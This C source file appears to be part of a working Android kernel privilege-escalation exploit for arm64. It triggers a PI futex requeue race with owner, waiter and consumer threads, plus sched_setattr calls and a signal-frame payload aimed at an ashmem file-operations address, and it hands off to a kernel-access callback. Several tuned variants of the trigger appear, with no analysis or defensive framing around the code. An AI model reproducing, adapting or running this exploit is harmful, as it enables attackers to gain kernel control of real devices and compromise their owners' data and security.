/*
 * Coordinates owner, waiter, and consumer threads around PI futex operations.
 * Uses signal-frame data and scheduler transitions to reach the post-trigger
 * kernel-access callback.
 */

#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stddef.h>
#include <stdatomic.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#include "07_futex_pi_trigger.h"
#include "09_pipe_buffer_rw.h"
#include "06_signal_frame_payload.h"
#include "target.h"

#define FUTEX_LOCK_PI 6
#define FUTEX_UNLOCK_PI 7
#define FUTEX_WAIT_REQUEUE_PI 11

/* Debug instrumentation (H0): split the v14 futex handshake wall time.
 * stderr only; no behavior change. g_futex_dbg_t0 is set at handshake entry
 * before any thread is created, so worker threads observe it too. */
static uint64_t g_futex_dbg_t0;
static uint64_t g_futex_dbg_last;

static uint64_t futex_now_ms(void) {
  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  return (uint64_t)ts.tv_sec * 1000u + (uint64_t)ts.tv_nsec / 1000000u;
}

void futex_v14_dbg(const char *name) {
  uint64_t n = futex_now_ms();
  fprintf(stderr, "[futex-v14] dbg phase=%s t=+%llums dt=%llums\n", name,
          (unsigned long long)(n - g_futex_dbg_t0),
          (unsigned long long)(n - g_futex_dbg_last));
  g_futex_dbg_last = n;
}

static long futex_op(uint32_t *uaddr, int op, uint32_t val,
                      const struct timespec *timeout, uint32_t *uaddr2,
                      uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

struct local_sched_attr {
  uint32_t size;
  uint32_t sched_policy;
  uint64_t sched_flags;
  int32_t sched_nice;
  uint32_t sched_priority;
  uint64_t sched_runtime;
  uint64_t sched_deadline;
  uint64_t sched_period;
};

struct v14_state_page {
  unsigned char pad[TARGET_FUTEX_V14_STATE_BASE_OFF];
  atomic_int waiter_tid;       /* +0x730 */
  atomic_int route_done;       /* +0x734 */
  uint32_t pi_chain;           /* +0x738 */
  atomic_int waiter_ready;     /* +0x73c */
  atomic_int owner_started;    /* +0x740 */
  atomic_int waiter_waiting;   /* +0x744 */
  uint32_t wait;               /* +0x748 */
  uint32_t pi_target;          /* +0x74c */
  atomic_int sched_done;       /* +0x750 */
  atomic_int gate;             /* +0x754 */
  atomic_int owner_acquired;   /* +0x758 */
  atomic_int attempt_count;    /* +0x75c */
  atomic_int success_count;    /* +0x760 */
  atomic_int stop;             /* +0x764 */
  atomic_int delay_us;         /* +0x768 */
  atomic_int state;            /* +0x76c */
  atomic_int secondary_0;      /* +0x770 */
  atomic_int secondary_1;      /* +0x774 */
};

#define V14_OFFSET_ASSERT(field, expected)                                  \
  _Static_assert(offsetof(struct v14_state_page, field) == (expected),      \
                 "v14 state offset mismatch: " #field)
V14_OFFSET_ASSERT(waiter_tid, TARGET_FUTEX_V14_WAITER_TID_OFF);
V14_OFFSET_ASSERT(route_done, TARGET_FUTEX_V14_ROUTE_DONE_OFF);
V14_OFFSET_ASSERT(pi_chain, TARGET_FUTEX_V14_PI_CHAIN_OFF);
V14_OFFSET_ASSERT(waiter_ready, TARGET_FUTEX_V14_WAITER_READY_OFF);
V14_OFFSET_ASSERT(owner_started, TARGET_FUTEX_V14_OWNER_STARTED_OFF);
V14_OFFSET_ASSERT(waiter_waiting, TARGET_FUTEX_V14_WAITER_WAITING_OFF);
V14_OFFSET_ASSERT(wait, TARGET_FUTEX_V14_WAIT_OFF);
V14_OFFSET_ASSERT(pi_target, TARGET_FUTEX_V14_PI_TARGET_OFF);
V14_OFFSET_ASSERT(sched_done, TARGET_FUTEX_V14_SCHED_DONE_OFF);
V14_OFFSET_ASSERT(gate, TARGET_FUTEX_V14_GATE_OFF);
V14_OFFSET_ASSERT(owner_acquired, TARGET_FUTEX_V14_OWNER_ACQUIRED_OFF);
V14_OFFSET_ASSERT(attempt_count, TARGET_FUTEX_V14_ATTEMPT_COUNT_OFF);
V14_OFFSET_ASSERT(success_count, TARGET_FUTEX_V14_SUCCESS_COUNT_OFF);
V14_OFFSET_ASSERT(stop, TARGET_FUTEX_V14_STOP_OFF);
V14_OFFSET_ASSERT(delay_us, TARGET_FUTEX_V14_DELAY_US_OFF);
V14_OFFSET_ASSERT(state, TARGET_FUTEX_V14_STATE_OFF);
V14_OFFSET_ASSERT(secondary_0, TARGET_FUTEX_V14_SECONDARY_0_OFF);
V14_OFFSET_ASSERT(secondary_1, TARGET_FUTEX_V14_SECONDARY_1_OFF);
#undef V14_OFFSET_ASSERT

static struct v14_state_page g_v14_state __attribute__((aligned(4096)));
static uint64_t g_v14_delay_cycles;
static atomic_int g_v14_followup_epoch;
static atomic_int g_v14_gate_seen;
static atomic_int g_v14_sig_ok;
static atomic_int g_v14_sched_ret;
static atomic_int g_v14_sched_errno;
static atomic_int g_v14_waiter_cpu;
static atomic_int g_v14_consumer_cpu;

static uint64_t read_cntvct(void) {
  uint64_t val;
  __asm__ volatile("mrs %0, cntvct_el0" : "=r"(val));
  return val;
}

static void spin_wait_cycles(uint64_t cycles) {
  if (cycles == 0) {
    return;
  }
  uint64_t start = read_cntvct();
  while (read_cntvct() - start < cycles) {
    __asm__ volatile("yield" ::: "memory");
  }
}

static int wait_for_atomic_deadline(atomic_int *value, int expected,
                                    uint64_t timeout_ms) {
  uint64_t deadline = futex_now_ms() + timeout_ms;
  while (atomic_load(value) != expected) {
    if (futex_now_ms() >= deadline) return 0;
    sched_yield();
  }
  return 1;
}

/* Informational only. Android may deny shell access to cpuN/online even when
 * the CPU is online and sched_setaffinity() can place this process there. */
static int cpu_online_hint(int cpu) {
  char path[64];
  snprintf(path, sizeof(path), "/sys/devices/system/cpu/cpu%d/online", cpu);
  FILE *fp = fopen(path, "re");
  if (!fp) return -1;
  int online = 0;
  int readable = fscanf(fp, "%d", &online) == 1;
  fclose(fp);
  return readable ? (online == 1) : -1;
}

static int verify_v14_cpu_contract(void) {
  static const int cpus[] = {0, 1, 3};
  cpu_set_t original;
  if (sched_getaffinity(0, sizeof(original), &original) != 0) {
    fprintf(stderr, "[futex-v14] CPU contract affinity-read failed errno=%d\n",
            errno);
    return 0;
  }
  int ok = 1;
  for (size_t i = 0; i < sizeof(cpus) / sizeof(cpus[0]); i++) {
    cpu_set_t probe;
    CPU_ZERO(&probe);
    CPU_SET(cpus[i], &probe);
    errno = 0;
    int affinity_ok = sched_setaffinity(0, sizeof(probe), &probe) == 0;
    int affinity_errno = errno;
    int actual_cpu = affinity_ok ? sched_getcpu() : -1;
    int online_hint = cpu_online_hint(cpus[i]);
    fprintf(stderr,
            "[futex-v14] CPU probe cpu=%d online_hint=%d affinity_ok=%d "
            "actual=%d errno=%d\n",
            cpus[i], online_hint, affinity_ok, actual_cpu, affinity_errno);
    if (!affinity_ok || actual_cpu != cpus[i]) {
      fprintf(stderr,
              "[futex-v14] CPU contract failed cpu=%d actual=%d errno=%d\n",
              cpus[i], actual_cpu, affinity_errno);
      ok = 0;
      break;
    }
  }
  int restore_errno = 0;
  if (sched_setaffinity(0, sizeof(original), &original) != 0) {
    restore_errno = errno;
    ok = 0;
  }
  if (!ok && restore_errno != 0) {
    fprintf(stderr,
            "[futex-v14] CPU contract affinity-restore failed errno=%d\n",
            restore_errno);
  }
  return ok;
}

static uint64_t supervisor_attempt_delay_cycles(void) {
  static const uint64_t kDelayTable[] = TARGET_FUTEX_DELAY_TABLE;
  const char *env = getenv("S23_SUPERVISOR_ATTEMPT");
  int idx_1based = 1;
  if (env != NULL && env[0] != '\0') {
    int v = atoi(env);
    idx_1based = (v > 1) ? v : 1;
  }
  int idx = (idx_1based - 1) & 7;
  return kDelayTable[idx];
}

static long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_nice = nice_value;
  return syscall(SYS_sched_setattr, tid, &attr, 0);
}

static long sched_setattr_tid_v4(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = 3; /* SCHED_BATCH */
  attr.sched_nice = nice_value;
  return syscall(SYS_sched_setattr, tid, &attr, 0);
}

static uint32_t f_wait;
static uint32_t f_pi_target;
static uint32_t f_pi_chain;
static atomic_int waiter_ready;
static atomic_int waiter_waiting;
static atomic_int owner_started;
static atomic_int owner_acquired;
static atomic_int deadlock_seen;
static atomic_int waiter_ok;
static atomic_int route_done;
static atomic_int waiter_tid_g;

static atomic_int g_use_sigusr1;
static uint64_t g_sigusr1_page_base;
static uint64_t g_sigusr1_ashmem_target;

#define WAIT_SEC TARGET_FUTEX_WAIT_SEC

static int g_futex_wait_sec = WAIT_SEC;

static int futex_env_int_clamped(const char *name, int fallback, int lo,
                                  int hi) {
  const char *raw = getenv(name);
  if (!raw || !*raw) return fallback;
  errno = 0;
  char *end = NULL;
  long v = strtol(raw, &end, 0);
  if (errno != 0 || end == raw || *end != '\0' || v < lo || v > hi) {
    return fallback;
  }
  return (int)v;
}

static int pin_to_cpu(int cpu) {
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(cpu, &set);
  return sched_setaffinity(0, sizeof(set), &set) == 0;
}

static void *waiter_thread_fn(void *arg) {
  (void)arg;
  pin_to_cpu(3);
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid_g, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex] waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += WAIT_SEC;

  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long wait_ret =
      futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  int wait_errno = errno;
  fprintf(stderr, "[futex] wait_requeue_pi ret=%ld errno=%d\n", wait_ret,
          wait_errno);
  if (wait_ret != -1 || wait_errno != ETIMEDOUT) {
    atomic_store(&route_done, 1);
    return NULL;
  }
  atomic_store(&waiter_ok, 1);

  if (atomic_load(&g_use_sigusr1)) {
    sigusr1_build_payload(g_sigusr1_page_base, g_sigusr1_ashmem_target);
    int sig_ok = sigusr1_fire_and_wait();
    fprintf(stderr, "[futex] sigusr1 fire_and_wait=%d\n", sig_ok);
  }

  while (!atomic_load(&deadlock_seen)) {
    __asm__ volatile("yield" ::: "memory");
  }
  if (futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex] waiter unlock chain errno=%d\n", errno);
    atomic_store(&route_done, 1);
    return NULL;
  }
  while (!atomic_load(&owner_acquired)) {
    __asm__ volatile("yield" ::: "memory");
  }

  atomic_store(&route_done, 1);
  for (;;) {
    sleep(1);
  }
}

static void *owner_thread_fn(void *arg) {
  (void)arg;
  if (futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex] owner lock target errno=%d\n", errno);
    return NULL;
  }
  while (!atomic_load(&waiter_ready)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }
  atomic_store(&owner_started, 1);
  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex] owner lock chain errno=%d\n", errno);
    return NULL;
  }
  atomic_store(&owner_acquired, 1);
  for (;;) {
    sleep(1);
  }
}

int run_futex_trigger_cb(futex_post_trigger_cb post_trigger_cb, void *ctx) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_acquired, 0);
  atomic_store(&deadlock_seen, 0);
  atomic_store(&waiter_ok, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid_g, 0);

  pthread_t waiter, owner;
  if (pthread_create(&waiter, NULL, waiter_thread_fn, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&owner, NULL, owner_thread_fn, NULL) != 0) {
    return 0;
  }

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  long requeue_ret = 0;
  int requeue_errno = 0;
  int polls = 0;
  while (polls < TARGET_FUTEX_LEGACY_POLL_COUNT) {
    polls++;
    errno = 0;
    requeue_ret =
        futex_op(&f_wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1, (void *)1,
                 &f_pi_target, 0);
    requeue_errno = errno;
    if (requeue_ret != 0) {
      break;
    }
    usleep(TARGET_FUTEX_POLL_USEC);
  }
  fprintf(stderr, "[futex] cmp_requeue_pi ret=%ld errno=%d polls=%d\n",
          requeue_ret, requeue_errno, polls);
  if (requeue_ret != -1 || requeue_errno != EDEADLK) {
    return 0;
  }
  atomic_store(&deadlock_seen, 1);

  while (!atomic_load(&route_done)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }
  if (!atomic_load(&waiter_ok)) {
    fprintf(stderr, "[futex] waiter route not ok, aborting before trigger\n");
    return 0;
  }

  spin_wait_cycles(supervisor_attempt_delay_cycles());

  int tid = atomic_load(&waiter_tid_g);
  fprintf(stderr, "[futex] firing sched_setattr tid=%d\n", tid);
  long ret = sched_setattr_tid(tid, 1);
  int saved_errno = errno;
  fprintf(stderr, "[futex] sched_setattr ret=%ld errno=%d\n", ret,
          saved_errno);
  if (ret != 0) {
    return 0;
  }

  if (post_trigger_cb == NULL) {
    return 1;
  }
  fprintf(stderr, "[futex] invoking post-trigger callback immediately\n");
  int cb_ret = post_trigger_cb(ctx);
  fprintf(stderr, "[futex] post-trigger callback returned %d\n", cb_ret);
  return cb_ret;
}

int run_futex_trigger(void) { return run_futex_trigger_cb(NULL, NULL); }

static void *owner_thread_fn_hold_only(void *arg) {
  (void)arg;
  if (futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v2] owner lock target errno=%d\n", errno);
    return NULL;
  }
  atomic_store(&owner_started, 1);
  for (;;) {
    sleep(1);
  }
}

static void *waiter_thread_fn_no_deadlock(void *arg) {
  (void)arg;
  pin_to_cpu(3);
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid_g, tid);

  atomic_store(&waiter_waiting, 1);
  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += WAIT_SEC;

  errno = 0;
  long wait_ret =
      futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  int wait_errno = errno;
  fprintf(stderr, "[futex-v2] wait_requeue_pi ret=%ld errno=%d\n", wait_ret,
          wait_errno);
  atomic_store(&waiter_ok, (wait_ret == -1 && wait_errno == ETIMEDOUT) ? 1 : 0);

  if (atomic_load(&waiter_ok) && atomic_load(&g_use_sigusr1)) {
    sigusr1_build_payload(g_sigusr1_page_base, g_sigusr1_ashmem_target);
    int sig_ok = sigusr1_fire_and_wait();
    fprintf(stderr, "[futex-v2] sigusr1 fire_and_wait=%d\n", sig_ok);
  }

  atomic_store(&route_done, 1);
  for (;;) {
    sleep(1);
  }
}

int run_futex_trigger_success_cb(futex_post_trigger_cb post_trigger_cb,
                                  void *ctx) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&waiter_ok, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid_g, 0);

  pthread_t waiter, owner;
  if (pthread_create(&owner, NULL, owner_thread_fn_hold_only, NULL) != 0) {
    return 0;
  }
  while (!atomic_load(&owner_started)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }
  if (pthread_create(&waiter, NULL, waiter_thread_fn_no_deadlock, NULL) != 0) {
    return 0;
  }
  while (!atomic_load(&waiter_waiting)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  /* Expect a REAL success here (ret >= 0), not EDEADLK. */
  errno = 0;
  long requeue_ret =
      futex_op(&f_wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1, (void *)1,
               &f_pi_target, 0);
  int requeue_errno = errno;
  fprintf(stderr, "[futex-v2] cmp_requeue_pi ret=%ld errno=%d\n", requeue_ret,
          requeue_errno);
  if (requeue_ret < 0) {
    fprintf(stderr, "[futex-v2] requeue failed, aborting before trigger\n");
    return 0;
  }

  while (!atomic_load(&route_done)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }
  if (!atomic_load(&waiter_ok)) {
    fprintf(stderr, "[futex-v2] waiter route not ok, aborting before trigger\n");
    return 0;
  }

  spin_wait_cycles(supervisor_attempt_delay_cycles());

  int tid = atomic_load(&waiter_tid_g);
  fprintf(stderr, "[futex-v2] firing sched_setattr tid=%d\n", tid);
  long ret = sched_setattr_tid(tid, 1);
  int saved_errno = errno;
  fprintf(stderr, "[futex-v2] sched_setattr ret=%ld errno=%d\n", ret,
          saved_errno);
  if (ret != 0) {
    return 0;
  }

  if (post_trigger_cb == NULL) {
    return 1;
  }
  fprintf(stderr, "[futex-v2] invoking post-trigger callback immediately\n");
  int cb_ret = post_trigger_cb(ctx);
  fprintf(stderr, "[futex-v2] post-trigger callback returned %d\n", cb_ret);
  return cb_ret;
}

static atomic_int g_requeue_succeeded;

static void *waiter_thread_fn_two_locks(void *arg) {
  (void)arg;
  pin_to_cpu(3);
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid_g, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v3] waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&waiter_waiting, 1);
  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += WAIT_SEC;

  errno = 0;
  long wait_ret =
      futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  int wait_errno = errno;
  fprintf(stderr, "[futex-v3] wait_requeue_pi ret=%ld errno=%d\n", wait_ret,
          wait_errno);
  atomic_store(&waiter_ok, (wait_ret == -1 && wait_errno == ETIMEDOUT) ? 1 : 0);

  if (atomic_load(&waiter_ok) && atomic_load(&g_use_sigusr1)) {
    sigusr1_build_payload(g_sigusr1_page_base, g_sigusr1_ashmem_target);
    int sig_ok = sigusr1_fire_and_wait();
    fprintf(stderr, "[futex-v3] sigusr1 fire_and_wait=%d\n", sig_ok);
  }

  atomic_store(&route_done, 1);
  for (;;) {
    sleep(1);
  }
}

static void *owner_thread_fn_two_locks(void *arg) {
  (void)arg;
  if (futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v3] owner lock target errno=%d\n", errno);
    return NULL;
  }
  atomic_store(&owner_started, 1);
  while (!atomic_load(&g_requeue_succeeded)) {
    __asm__ volatile("yield" ::: "memory");
  }
  fprintf(stderr, "[futex-v3] owner attempting second lock (f_pi_chain)\n");
  errno = 0;
  long ret = futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  fprintf(stderr, "[futex-v3] owner lock chain ret=%ld errno=%d\n", ret, errno);
  atomic_store(&owner_acquired, 1);
  for (;;) {
    sleep(1);
  }
}

int run_futex_trigger_v3_cb(futex_post_trigger_cb post_trigger_cb, void *ctx) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_acquired, 0);
  atomic_store(&waiter_ok, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid_g, 0);
  atomic_store(&g_requeue_succeeded, 0);

  pthread_t waiter, owner;
  if (pthread_create(&owner, NULL, owner_thread_fn_two_locks, NULL) != 0) {
    return 0;
  }
  while (!atomic_load(&owner_started)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }
  if (pthread_create(&waiter, NULL, waiter_thread_fn_two_locks, NULL) != 0) {
    return 0;
  }
  while (!atomic_load(&waiter_waiting)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  errno = 0;
  long requeue_ret =
      futex_op(&f_wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1, (void *)1,
               &f_pi_target, 0);
  int requeue_errno = errno;
  fprintf(stderr, "[futex-v3] cmp_requeue_pi ret=%ld errno=%d\n", requeue_ret,
          requeue_errno);
  if (requeue_ret < 0) {
    fprintf(stderr, "[futex-v3] requeue failed, aborting before trigger\n");
    return 0;
  }
  atomic_store(&g_requeue_succeeded, 1);

  while (!atomic_load(&route_done)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }
  if (!atomic_load(&waiter_ok)) {
    fprintf(stderr, "[futex-v3] waiter route not ok, aborting before trigger\n");
    return 0;
  }

  spin_wait_cycles(supervisor_attempt_delay_cycles());

  int tid = atomic_load(&waiter_tid_g);
  fprintf(stderr, "[futex-v3] firing sched_setattr tid=%d\n", tid);
  long ret = sched_setattr_tid(tid, 1);
  int saved_errno = errno;
  fprintf(stderr, "[futex-v3] sched_setattr ret=%ld errno=%d\n", ret,
          saved_errno);
  if (ret != 0) {
    return 0;
  }

  if (post_trigger_cb == NULL) {
    return 1;
  }
  fprintf(stderr, "[futex-v3] invoking post-trigger callback immediately\n");
  int cb_ret = post_trigger_cb(ctx);
  fprintf(stderr, "[futex-v3] post-trigger callback returned %d\n", cb_ret);
  return cb_ret;
}

int run_futex_trigger_v3_full(uint64_t page_base,
                               uint64_t ashmem_misc_fops_addr,
                               futex_post_trigger_cb post_trigger_cb,
                               void *ctx) {
  if (!sigusr1_install_handler()) {
    fprintf(stderr, "[futex-v3] sigusr1 handler install failed, aborting\n");
    return 0;
  }
  g_sigusr1_page_base = page_base;
  g_sigusr1_ashmem_target = ashmem_misc_fops_addr;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_v3_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  return ret;
}

int run_futex_trigger_success_full(uint64_t page_base,
                                    uint64_t ashmem_misc_fops_addr,
                                    futex_post_trigger_cb post_trigger_cb,
                                    void *ctx) {
  if (!sigusr1_install_handler()) {
    fprintf(stderr, "[futex-v2] sigusr1 handler install failed, aborting\n");
    return 0;
  }
  g_sigusr1_page_base = page_base;
  g_sigusr1_ashmem_target = ashmem_misc_fops_addr;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_success_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  return ret;
}

int run_futex_trigger_full(uint64_t page_base, uint64_t ashmem_misc_fops_addr,
                            futex_post_trigger_cb post_trigger_cb, void *ctx) {
  if (!sigusr1_install_handler()) {
    fprintf(stderr, "[futex] sigusr1 handler install failed, aborting\n");
    return 0;
  }
  g_sigusr1_page_base = page_base;
  g_sigusr1_ashmem_target = ashmem_misc_fops_addr;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  return ret;
}

int run_futex_trigger_v4_cb(futex_post_trigger_cb post_trigger_cb, void *ctx) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_acquired, 0);
  atomic_store(&deadlock_seen, 0);
  atomic_store(&waiter_ok, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid_g, 0);

  if (!pin_to_cpu(1)) {
    return 0;
  }

  pthread_t waiter, owner;
  if (pthread_create(&waiter, NULL, waiter_thread_fn, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&owner, NULL, owner_thread_fn, NULL) != 0) {
    return 0;
  }

  while (!atomic_load(&waiter_waiting) && !atomic_load(&owner_started)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  usleep(TARGET_FUTEX_PAUSE_USEC);

  long requeue_ret = 0;
  int requeue_errno = 0;
  errno = 0;
  requeue_ret = futex_op(&f_wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1,
                          (void *)1, &f_pi_target, 0);
  requeue_errno = errno;
  fprintf(stderr, "[futex-v4] cmp_requeue_pi ret=%ld errno=%d\n", requeue_ret,
          requeue_errno);
  if (requeue_ret == -1 && requeue_errno == EDEADLK) {
    fprintf(stderr,
            "[futex-v4] EDEADLK (matches original dance's natural "
            "outcome) -- aborting before trigger\n");
    atomic_store(&deadlock_seen, 1);
    return 0;
  }
  atomic_store(&deadlock_seen, 1);

  while (!atomic_load(&route_done)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }
  if (!atomic_load(&waiter_ok)) {
    fprintf(stderr, "[futex-v4] waiter route not ok, aborting before trigger\n");
    return 0;
  }

  spin_wait_cycles(supervisor_attempt_delay_cycles());

  int tid = atomic_load(&waiter_tid_g);
  fprintf(stderr, "[futex-v4] firing sched_setattr tid=%d policy=SCHED_BATCH nice=19\n",
          tid);
  long ret = sched_setattr_tid_v4(tid, 19);
  int saved_errno = errno;
  fprintf(stderr, "[futex-v4] sched_setattr ret=%ld errno=%d\n", ret,
          saved_errno);
  if (ret != 0) {
    return 0;
  }

  if (post_trigger_cb == NULL) {
    return 1;
  }
  fprintf(stderr, "[futex-v4] invoking post-trigger callback immediately\n");
  int cb_ret = post_trigger_cb(ctx);
  fprintf(stderr, "[futex-v4] post-trigger callback returned %d\n", cb_ret);
  return cb_ret;
}

int run_futex_trigger_v4_full(uint64_t page_base,
                               uint64_t ashmem_misc_fops_addr,
                               futex_post_trigger_cb post_trigger_cb,
                               void *ctx) {
  if (!sigusr1_install_handler()) {
    fprintf(stderr, "[futex-v4] sigusr1 handler install failed, aborting\n");
    return 0;
  }
  g_sigusr1_page_base = page_base;
  g_sigusr1_ashmem_target = ashmem_misc_fops_addr;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_v4_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  return ret;
}

static atomic_int g_consumer_done;
static long g_consumer_ret;
static int g_consumer_errno;

static void *consumer_thread_fn(void *arg) {
  (void)arg;
  pin_to_cpu(1);

  int tid;
  for (;;) {
    tid = atomic_load(&waiter_tid_g);
    if (tid != 0) {
      break;
    }
    __asm__ volatile("yield" ::: "memory");
  }

  fprintf(stderr, "[futex-v5] consumer firing sched_setattr tid=%d "
                   "policy=SCHED_BATCH nice=19 (independent of "
                   "cmp_requeue_pi/route_done)\n",
          tid);
  errno = 0;
  long ret = sched_setattr_tid_v4(tid, 19);
  int saved_errno = errno;
  fprintf(stderr, "[futex-v5] consumer sched_setattr ret=%ld errno=%d\n", ret,
          saved_errno);
  g_consumer_ret = ret;
  g_consumer_errno = saved_errno;
  atomic_store(&g_consumer_done, 1);
  return NULL;
}

int run_futex_trigger_v5_cb(futex_post_trigger_cb post_trigger_cb, void *ctx) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_acquired, 0);
  atomic_store(&deadlock_seen, 0);
  atomic_store(&waiter_ok, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid_g, 0);
  atomic_store(&g_consumer_done, 0);
  g_consumer_ret = -1;
  g_consumer_errno = 0;

  pin_to_cpu(0);

  pthread_t waiter, owner, consumer;
  if (pthread_create(&waiter, NULL, waiter_thread_fn, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&owner, NULL, owner_thread_fn, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&consumer, NULL, consumer_thread_fn, NULL) != 0) {
    return 0;
  }

  while (!atomic_load(&waiter_waiting) && !atomic_load(&owner_started)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  usleep(TARGET_FUTEX_PAUSE_USEC);

  errno = 0;
  long requeue_ret = futex_op(&f_wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1,
                               (void *)1, &f_pi_target, 0);
  int requeue_errno = errno;
  fprintf(stderr, "[futex-v5] cmp_requeue_pi ret=%ld errno=%d\n", requeue_ret,
          requeue_errno);

  atomic_store(&deadlock_seen, 1);

  while (!atomic_load(&route_done)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }
  while (!atomic_load(&g_consumer_done)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }
  fprintf(stderr,
          "[futex-v5] consumer done: sched_setattr ret=%ld errno=%d\n",
          g_consumer_ret, g_consumer_errno);

  if (!atomic_load(&waiter_ok)) {
    fprintf(stderr, "[futex-v5] waiter route not ok, aborting before verify\n");
    return 0;
  }
  if (g_consumer_ret != 0) {
    fprintf(stderr,
            "[futex-v5] consumer sched_setattr failed, aborting before "
            "verify\n");
    return 0;
  }

  if (post_trigger_cb == NULL) {
    return 1;
  }
  fprintf(stderr, "[futex-v5] invoking post-trigger callback immediately\n");
  int cb_ret = post_trigger_cb(ctx);
  fprintf(stderr, "[futex-v5] post-trigger callback returned %d\n", cb_ret);
  return cb_ret;
}

int run_futex_trigger_v5_full(uint64_t page_base,
                               uint64_t ashmem_misc_fops_addr,
                               futex_post_trigger_cb post_trigger_cb,
                               void *ctx) {
  if (!sigusr1_install_handler()) {
    fprintf(stderr, "[futex-v5] sigusr1 handler install failed, aborting\n");
